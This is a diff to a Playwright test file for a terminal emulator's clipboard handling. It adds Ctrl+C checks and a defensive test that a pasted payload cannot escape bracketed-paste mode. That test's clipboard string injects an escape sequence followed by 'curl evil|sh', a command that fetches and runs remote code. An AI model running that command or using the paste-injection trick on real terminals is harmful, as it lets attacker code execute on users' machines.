@@ -68,6 +68,14 @@ for (const backend of ["native", "herdr"] as const) {
         await page.keyboard.press(key);
         await expect.poll(() => page.evaluate(() => navigator.clipboard.readText())).toBe("SELECTABLE");
         expect(Buffer.concat(inputs).toString("utf8")).toBe("");
+        await page.evaluate(() => navigator.clipboard.writeText(""));
+        await page.keyboard.press("Control+c");
+        if (key === "Control+c") {
+          await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\x03");
+        } else {
+          await expect.poll(() => page.evaluate(() => navigator.clipboard.readText())).toBe("SELECTABLE");
+          expect(Buffer.concat(inputs).toString("utf8")).toBe("");
+        }
       });
     }
 
@@ -89,6 +97,14 @@ for (const backend of ["native", "herdr"] as const) {
       });
       await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\x1b[200~context\rmenu\x1b[201~");
     });
+
+    if (backend === "herdr") {
+      test("pasted text cannot end the paste early and type the rest as keys", async ({ page }) => {
+        await page.evaluate(() => navigator.clipboard.writeText("\x1b[20\x1b[201~1~\ncurl evil|sh\n日本🙂"));
+        await page.keyboard.press("Control+v");
+        await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\x1b[200~[201~\rcurl evil|sh\r日本🙂\x1b[201~");
+      });
+    }
 
     if (backend === "native") {
       test("selected Ctrl+C still copies when the program has taken the mouse", async ({ page }) => {
